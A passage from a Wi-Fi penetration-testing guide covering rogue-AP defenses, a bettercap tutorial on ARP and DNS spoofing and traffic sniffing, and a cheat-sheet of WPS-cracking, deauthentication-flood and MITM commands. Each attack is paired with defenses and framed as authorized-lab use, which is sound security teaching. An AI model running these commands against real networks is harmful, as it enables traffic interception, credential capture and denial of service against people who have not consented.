recognition (Pineapple/Pwnagotchi/Wifiphisher/Marauder/Flipper/O.MG), disconnection-frame & probe-request
monitors, Graylog forwarding. Both need stationary monitor-mode sensors; lock each to a channel (hopping misses fast floods).

### 4.6 DEFENSE — rogue-AP (make the attack fail even if present)

- **802.11w / PMF required** — forged deauth/disassoc rejected → kills the "peel clients off" step. (Doesn't hide the rogue beacon; it stops the herding DoS.) Monitor `NOCLIENTMFP` for the remaining exposure.
- **WPA3-SAE + Transition Disable (802.11-2020)** — a client that authenticated via WPA3 once stops connecting to the WPA2 variant of that SSID → closes the downgrade path the twin relies on.
- **Enterprise: enforce RADIUS server-certificate validation on every supplicant** (pin the **CA** *and* the server **name/CN**; "do not prompt to trust new servers"), deploy via **MDM/GPO** so users can't click-through, **prefer EAP-TLS** (mutual cert — no password to steal), disable weak inner methods (EAP-GTC, PAP). This single control defeats the §4.1 enterprise-twin capture.
- **Client hygiene vs Karma/MANA/known-beacon:** turn **off auto-join** for open networks, **prune the PNL** (delete open/public SSIDs after use — no PNL entry = nothing to impersonate; a short generic PNL starves known-beacon wordlists), "Ask to Join Networks", avoid marking networks **hidden** (forces the client to probe the SSID by name everywhere). **MAC randomization helps privacy, NOT this attack** — the PNL still leaks (Vanhoef et al. ASIACCS 2016) and scans *while connecting* aren't randomized; the durable fix is PNL hygiene + no auto-join.
- **Operational:** current AP allowlist, stationary WIDS (Kismet/nzyme), alert on deauth storms + APSPOOF, **physically locate** confirmed rogues (signal walk-down / trilateration), correlate air vs wire. Public Wi-Fi has no WIDS → a twin at a hotel/airport is a **client-side** problem (HTTPS, VPN, cert checks, auto-join off).

---

## 5. MITM after access — bettercap (ARP · DNS · sniff)

Once associated to the LAN (managed mode — **monitor mode is NOT needed** for ARP MITM), bettercap is the
modern modular MITM framework. **ARP has no authentication:** an unsolicited ARP reply ("IP x is at MAC y")
poisons the victim's (and optionally the gateway's) cache so your box sits **on-path**. From there: **sniff**
(`net.sniff`), **redirect DNS** (`dns.spoof`), **tamper HTTP** (`http.proxy`), and *attempt* HTTPS downgrade
(`sslstrip`/`hstshijack`) — which largely **fails** on modern browsers (§5.5).

### 5.1 Install & fundamentals

```bash
sudo apt update && sudo apt install bettercap          # Kali v2.41.x+
sudo bettercap -eval "caplets.update; q"               # caplets aren't in the .deb -> /usr/share/bettercap/caplets
sudo bettercap -iface wlan0                             # interactive, bound to the test-LAN iface
sudo bettercap -iface wlan0 -caplet lab-mitm           # run a caplet by name/path
sudo bettercap -iface wlan0 -eval "set arp.spoof.targets 192.168.50.20; arp.spoof on"
```

In-session: `help` / `help <module>` (per-module params — do this!), `active`, `get <param>` / `get *`,
`set <param> <val>` (`set X ""` clears), `net.probe on|off`, `ticker on`, `alias <mac> victim`, `include <caplet>`,
`!<shell>`, chain with `;`, `q` (quits and **restores spoofed caches**).

### 5.2 Decision order

```
1. Bind the right iface (-iface wlan0); confirm it's on the test LAN.
2. Recon: net.recon (passive, default ON) + a short net.probe burst; net.show. Find gateway + victim.
3. SCOPE the target: set arp.spoof.targets <victim-ip>  (default = WHOLE SUBNET -- never leave it in shared air).
4. Duplex/ban: half-duplex (default) vs arp.spoof.fullduplex true; or arp.ban for pure DoS.
5. Turn net.probe OFF before arp.spoof on (the #1 mistake -- they fight over the host table).
6. arp.spoof on (bettercap auto-enables ip_forward on Linux).
7. Layer payload: net.sniff (observe) / dns.spoof (redirect) / http.proxy (tamper) -- all need the spoof live.
8. Verify on the victim (arp -a shows YOUR MAC for the gateway; traffic flows).
9. Collect to pcap; analyze off-box in Wireshark on the Mac.
10. Tear down: stop modules, q (re-ARPs correct values); confirm victim recovers.
```

### 5.3 ARP spoof (defaults from bettercap.org)

```bash
net.probe on          # ACTIVE host discovery -- wait ~5-10s
net.show              # IP / MAC / vendor / last-seen
net.probe off         # <-- OFF before spoofing

set arp.spoof.targets 192.168.50.20        # scope it! (default = entire subnet)
set arp.spoof.fullduplex false             # half-duplex = poison only the client (fallback vs protected gateway)
arp.spoof on
```

Params: `arp.spoof.targets` (default **entire subnet**; MACs/IPs/ranges/aliases), `arp.spoof.whitelist`
(skip), `arp.spoof.internal` (also host-to-host, e.g. victim↔NAS), `arp.spoof.fullduplex` (poison targets
**and** gateway — fails against a DAI/ARP-protected gateway → drop to half-duplex), `arp.spoof.interval`
(1000 ms). `arp.ban on` = ban mode (victim loses connectivity, no forwarding — DoS test). If you ever run
primitives by hand: `sysctl -w net.ipv4.ip_forward=1`.

### 5.4 DNS spoof & sniff

```bash
# DNS spoof REQUIRES arp.spoof active to see other hosts' queries.
set dns.spoof.address 192.168.50.10                       # your Kali IP (default: iface addr)
set dns.spoof.domains lab.example.test,*.lab.example.test
dns.spoof on
# Hosts-file form (overrides the params; "IP  domain" per line):
set dns.spoof.hosts /root/lab.hosts
dns.spoof on
#   dns.spoof.all=false (reply only to queries aimed at us) ; dns.spoof.ttl=1024

# Sniff to pcap (default filter "not arp"):
set net.sniff.local true
set net.sniff.verbose true
set net.sniff.output /root/lab-capture.pcap
net.sniff on
# Quieter targeted BPF, or regex cred-pattern demo:
set net.sniff.filter "tcp port 80 or udp port 53"
set net.sniff.regexp "(password|passwd|pwd)="
```

BPF cheats: `host 192.168.50.20`, `ether proto 0x888e` (EAPOL), `port 53`, `tcp[tcpflags] & tcp-syn != 0`.

### 5.5 HTTP tamper & the sslstrip/HSTS reality check (concept + defense only)

```bash
set http.proxy.sslstrip true
http.proxy on            # transparent HTTP proxy (port 80); sslstrip ATTEMPTS to keep victim on http://
```

**Why sslstrip mostly fails (2025/26):** **HSTS** (browser refuses plain HTTP once it's seen the header),
**HSTS preload** (major sites compiled into the browser → HTTPS enforced on the *first* connection, no strip
window), **HTTPS-first/Only mode** (auto-upgrade + downgrade warnings). Net: it only bites non-preloaded
sites visited over HTTP first, and the UI screams. **`hstshijack`** dodges HSTS with a **homoglyph look-alike**
domain (`facebook.com`→`facebook.corn`) + matching `dns.spoof` — works **only if the real domain is
misconfigured** (no `includeSubDomains`, not preloaded).

> **Boundary:** `hstshijack` also ships a JS **payload/keylogger** path (`hstshijack.payloads`,
> `http.proxy.script`) — a **credential/keystroke harvester, kept out of scope.** Stop at *demonstrating
> that a modern browser defeats the downgrade* (a great teaching moment), then pivot to defense. Measure what
> still leaks under TLS: **SNI**, DNS names (unless DoH/DoT), IP/metadata, any app that ignores cert validation.

### 5.6 Caplet (repeatable own-lab run) & teardown

```bash
# /usr/local/share/bettercap/caplets/lab-mitm.cap  -- authorized lab only; edit TARGET+IFACE
net.recon on
net.probe on
sleep 8
net.probe off
set arp.spoof.targets 192.168.50.20
set arp.spoof.fullduplex false
arp.spoof on
set net.sniff.filter "not arp"
set net.sniff.output /root/lab-mitm.pcap
net.sniff on
```
```bash
sudo bettercap -iface wlan0 -caplet lab-mitm
# Teardown:  arp.spoof off ; dns.spoof off ; http.proxy off ; net.sniff off ; q
# Verify on victim: arp -a -> gateway shows the REAL router MAC; internet works. (reset ip_forward if set by hand)
```

### 5.7 MITM gotchas

- **`net.probe` must be OFF before `arp.spoof on`** (#1 mistake). **`dns.spoof` sees nothing without `arp.spoof`.**
- **Default `arp.spoof.targets` = whole subnet** — forgetting to scope poisons everyone in a shared lab.
- **`fullduplex true` fails vs a DAI/ARP-protected gateway** → half-duplex. **Wi-Fi client isolation / guest mode** blocks L2 peer traffic → use a lab SSID without isolation.
- **Version drift** — Kali is v2.41.x; old blog flags (v1.x/2.11/2.23) are stale. Confirm with `help <module>` on *your* build.
- **mDNS/LLMNR/NBT-NS** can bypass your DNS spoof on Windows (separate poisoning surface, e.g. Responder).

### 5.8 DEFENSE — MITM

- **ARP:** **Dynamic ARP Inspection (DAI)** on managed switches (needs **DHCP snooping** first; trust uplink/DHCP ports, rate-limit the rest), **static ARP** for critical hosts (gateway/servers; DAI needs an ARP ACL for static-IP hosts), **arpwatch** on key assets (alerts on MAC↔IP binding changes), **VLAN/private-VLAN segmentation + Wi-Fi client isolation** (ARP spoof is L2-local → shrink the broadcast domain). Detection signals: two IPs claiming one MAC, one IP flapping between MACs, ~1/s gratuitous-ARP flood, gateway MAC suddenly changing (`arp.duplicate-address-detected`).
- **DNS:** **DNSSEC** (record authenticity), **DoH/DoT** (encrypt+authenticate resolver path — a DoH browser ignores your `dns.spoof` entirely), pinned resolvers, short caches.
- **HTTP/sslstrip:** **HSTS with `includeSubDomains` + preload**, browser **HTTPS-Only mode**, cert/public-key pinning for apps — a preloaded site cannot be stripped (that's the defense working).
- **General L2/host hygiene:** 802.1X port auth, disable LLMNR/NBT-NS/mDNS where unneeded, alert on new gateways and promiscuous NICs.

---

## 6. Cross-cutting defense summary (the throughline)

| Attack surface | Primary control (does the real work) | Verify / detect |
|---|---|---|
| **WPS** (§2) | **Disable WPS in firmware** (+ patch RNG / retire gear) | `wash` shows BSSID **absent**; config/firmware audit |
| **Deauth/DoS** (§3) | **802.11w/PMF required**; WPA3-SAE (no long-lived transition) | tshark deauth-rate; Kismet `DEAUTHFLOOD`; patch AP+clients |
| **Evil-twin / Karma** (§4) | **PMF** (stop herding) + **WPA3+Transition-Disable** + **client PNL hygiene / no auto-join**; **RADIUS cert validation / EAP-TLS** for enterprise | allowlist diff; one-BSSID-many-ESSID; Kismet `APSPOOF`/`KARMAOUI`; nzyme |
| **MITM** (§5) | **DAI + DHCP snooping**, **DoH/DoT + DNSSEC**, **HSTS preload + HTTPS-Only** | arpwatch; duplicate-address; `help`-verified monitoring |

**Recurring themes:** (1) **802.11w/PMF + WPA3-SAE** is the single biggest hardening win across deauth and
evil-twin. (2) **Baseline then diff** — an allowlist of `ESSID,BSSID,CH,ENC,PMF` turns rogue detection into a
`comm`/`diff` one-liner. (3) Several "defenses" are **ineffective** and should be recorded as such: MAC
filtering, SSID hiding, VPN-against-L2-deauth, WPS lockout-against-Pixie, MAC randomization-against-Karma.

---

## 7. Quick allowlist-gated wrapper (lab hygiene — enforce before any transmit)

```
target = input()
assert target in ALLOWLIST                 # hard stop otherwise
assert band(target) == "2.4GHz"            # RTL8188EUS limit
pmf = read_rsn_mfp(target)                 # airodump / iw
if pmf == "required": log("deauth expected mitigated by 802.11w -> pivot to PMKID")
build whitelist.txt from ALLOWLIST-owned devices   # protect own kit (mdk4 -w / eaphammer --mac-whitelist / arp.spoof.whitelist)
use lowest TX power that reaches the target; shortest run window
run the scoped attack; capture; stop on objective
emit finding + its DEFENSE block           # the deliverable
tear down; wipe logs of any out-of-scope devices
```

---

## 8. Consolidated command cheat-sheet

```bash
# --- prep (all sections) ---
sudo airmon-ng check kill && sudo airmon-ng start wlan0 6 && iw dev
sudo aireplay-ng --test wlan0mon

# --- WPS (§2): recon -> Pixie -> default/NULL -> online -> PIN->PSK -> one-shot ---
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K 1 -N -vv                 # Pixie (primary)
sudo bully  wlan0mon -b <BSSID> -c <CH> -d -v 3                         # Pixie (fallback engine)
pixiewps --pke <..> --pkr <..> --e-hash1 <..> --e-hash2 <..> --authkey <..> --e-nonce <..>
pixiewps ... --mode 3 --start 01/2019 --end 01/2026 -j 0               # Realtek time sweep
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -p 12345670 -vv             # default/known PIN
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -f -N -g 1 -vv -p ''        # NULL PIN
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -N -L -d 15 -r 3:60 -x 60 -vv   # online brute (tuned)
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -p <8-digit-PIN> -vv        # PIN -> WPA PSK
sudo wifite -i wlan0 --wps --pixie --kill
sudo wash -i wlan0mon                                                  # DEFENSE verify: BSSID must NOT appear

# --- deauth & DoS (§3) ---
sudo airodump-ng -c <CH> --bssid <BSSID> -w /root/lab/hs wlan0mon
sudo aireplay-ng -0 3 -a <BSSID> -c <CLIENT> wlan0mon                  # short burst for handshake
sudo aireplay-ng -0 0 -a <BSSID> -c <CLIENT> wlan0mon                  # continuous DoS
sudo mdk4 wlan0mon d -B <BSSID> -E "<SSID>" -s 200 -w whitelist.txt

# --- rogue-AP DETECTION (§4) ---
sudo airodump-ng --band abg -w survey --output-format csv,pcap --write-interval 1 wlan0mon
awk -F',' 'NR>1 && $14 ~ /YourCorpSSID/ {gsub(/ /,"",$1); print $1}' survey-01.csv | sort -u | comm -23 - <(sort -u allowlist.txt)
sudo tshark -i wlan0mon -q -z io,stat,10,'COUNT(frame)wlan.fc.type_subtype==0x0c'
sudo tshark -i mon0 -Y 'wlan.fc.type_subtype==0x05' -T fields -e wlan.sa -e wlan.ssid | sort | uniq -c | sort -rn
sudo kismet -c wlan0mon                                               # apspoof=/alert= in kismet_site.conf

# --- MITM (§5) ---
sudo bettercap -iface wlan0
#  net.probe on; (wait); net.show; net.probe off
#  set arp.spoof.targets <victim-ip>; arp.spoof on
#  set dns.spoof.domains <dom>; dns.spoof on   |   set net.sniff.output /root/cap.pcap; net.sniff on
#  arp.spoof off; q   (restores ARP)  ->  verify victim: arp -a shows the real gateway MAC
```

---

## 9. Sources (deduplicated across the merged files)

**WPS / Pixie-Dust / reaver / bully / pixiewps**
- pixiewps project + FAQ (protocol, modes): https://github.com/wiire-a/pixiewps ; https://github.com/wiire-a/pixiewps/wiki/FAQ ; Kali: https://www.kali.org/tools/pixiewps/
- reaver-wps-fork-t6x README + `-K` integration: https://github.com/t6x/reaver-wps-fork-t6x ; Kali: https://www.kali.org/tools/reaver/ ; man: https://man.archlinux.org/man/reaver.1.en.txt
- bully: https://www.kali.org/tools/bully/ ; README: https://sources.debian.org/src/bully/1.4.00-2/README.md
- wifite2: https://github.com/derv82/wifite2 ; Wifite how-to (flags/order): https://stationx.net/how-to-use-wifite/
- Protocol/algorithm: hostap `wps_common.c` checksum: https://fuchsia.googlesource.com/third_party/hostap/+/upstream/android-m/src/wps/wps_common.c ; Viehböck 2011; Bongard (Pixie, Hack.lu/DEF CON 2014); gengstah Pixie wiki: https://gengstah.github.io/wiki/attacks/pixie-dust-wps/
- Default-PIN research: SEC Consult EasyBox (MAC+serial): https://packetstormsecurity.com/files/122698/ ; D-Link WPS PIN reversing: https://rstforums.com/forum/topic/87138 ; TRENDnet TEW-818RDU: https://packetstormsecurity.com/files/132477/
- 2025 status: Help Net Security (NetRise 20/24): https://www.helpnetsecurity.com/2025/09/17/ ; SecurityWeek: https://www.securityweek.com/decade-old-pixie-dust-wi-fi-hack-still-impacts-many-devices/
- Workflow/defense: The Hacker Recipes — Wi-Fi/WPS: https://thehacker.recipes/radio/wi-fi/wps/

**Deauth / 802.11 DoS / PMF**
- aircrack-ng deauth tutorial: https://www.aircrack-ng.org/doku.php?id=deauthentication ; aireplay-ng(8): https://man.archlinux.org/man/aireplay-ng.8.en ; Kali aircrack-ng: https://www.kali.org/tools/aircrack-ng/
- mdk4: https://www.kali.org/tools/mdk4/ ; man: https://man.archlinux.org/man/mdk4.8.en
- PMF/MFPC-vs-MFPR: Aruba/HPE https://arubanetworking.hpe.com/techdocs/aos/wifi-design-deploy/security/features/pmf/ ; Cisco MFP; Wi-Fi Alliance PMF: https://www.wi-fi.org/node/36713
- WPA3 transition downgrade: SecureW2; Purple https://www.purple.ai/guides/wpa3-transition-mode-connection-failures
- Research: Lounis et al. "Cut It" (FPS 2021): https://unpaywall.org/10.1007%2F978-3-031-08147-7_16 ; Schepers/Ranganathan/Vanhoef 2022: https://lirias.kuleuven.be/retrieve/667987 ; hostap wifi-deauthentication (CVE-2023-21061): https://github.com/domienschepers/wifi-deauthentication ; KTO PoC (invalid-deauth vs PMF): https://radar.offseq.com/threat/flooding-invalid-deauth-frames-still-kicks-pmf-cli-b4b79764
- WIDS: Fortinet WIDS profile: https://docs.fortinet.com/document/fortiap/6.4.1/... ; Null Byte deauth-detection with Wireshark

**Evil-twin / Karma / MANA — detection & defense**
- Kismet alerts: https://www.kismetwireless.net/docs/readme/alerts/alerts/ ; Kali: https://www.kali.org/tools/kismet/ ; Kershaw SharkFest WIDS talk
- nzyme: https://www.nzyme.org/capabilities/wireless ; https://github.com/Offensive-Wireless/nzyme ; deauth-frames explained: https://www.nzyme.org/knowledge/wifi/deauthentication-frames-explained
- MITRE ATT&CK DET0379 (detect evil-twin): https://attack.mitre.org/detectionstrategies/DET0379/
- SensePost hostapd-mana wiki (KARMA/MANA theory + options): https://github.com/sensepost/hostapd-mana/wiki ; MANA blog 2015: https://sensepost.com/blog/2015/improvements-in-rogue-ap-attacks-mana-1/2/
- DEF CON 22 White & de Villiers "Manna from Heaven"; SpecterOps Modern Wireless Tradecraft Pt I–IV: https://specterops.io/blog/2019/10/28/... (and /11/04, /11/12, /11/22)
- eaphammer: https://www.kali.org/tools/eaphammer ; https://github.com/s0lst1c3/eaphammer ; airbase-ng(8): https://man.archlinux.org/man/airbase-ng.8.en
- MAC-randomization / PNL leak: Vanhoef et al. ASIACCS 2016: https://lirias.kuleuven.be/bitstream/123456789/543617/1//asiaccs2016.pdf ; Apple Platform Security (Wi-Fi privacy); Arista MAC-randomization whitepaper
- Enterprise cert-validation control: Infosec Institute "Attacking WPA2 Enterprise"
- Signal/TX method: GDS Security "Slaying Rogue APs": https://blog.gdssecurity.com/labs/2016/8/26/ ; Aon Cyber Labs probe-response/signal paper; arXiv 2406.01927 (position-based rogue-AP); Purple.ai RF fingerprinting
- rtl8188eus driver: https://github.com/aircrack-ng/rtl8188eus ; airodump-ng(8): https://man.archlinux.org/man/airodump-ng.8.en ; HackTricks Pentesting Wi-Fi

**MITM / bettercap**
- bettercap modules: arp.spoof https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/ ; dns.spoof https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/ ; net.sniff https://www.bettercap.org/modules/ethernet/netsniff/ ; interactive/caplets https://www.bettercap.org/usage/interactive_session/ ; "All hail bettercap 2.0" https://www.evilsocket.net/2018/02/27/... ; caplets repo https://github.com/bettercap/caplets ; Kali: https://www.kali.org/tools/bettercap/
- Workflow: koutto pi-pwnbox-rogueap wiki (MitM Commands); 7h3w4lk3r the-hive bettercap notes; StationX bettercap tutorial (2026)
- HSTS/sslstrip reality: jlajara HSTS bypass: https://jlajara.gitlab.io/HSTS
- Defense: Juniper DAI; Extreme Networks DAI+DHCP-snooping; Fidelis / InventiveHQ ARP-spoofing detection guides

> **Framing reminder:** authorized / own-gear only. Rogue-AP (§4) and the HTTPS-downgrade payload path (§5.5)
> are **detection + concept** here by design — no credential/keystroke harvester or captive portal is built.
> Re-verify every flag with `-h` / `man` / `help <module>` on *your* installed version before relying on it.
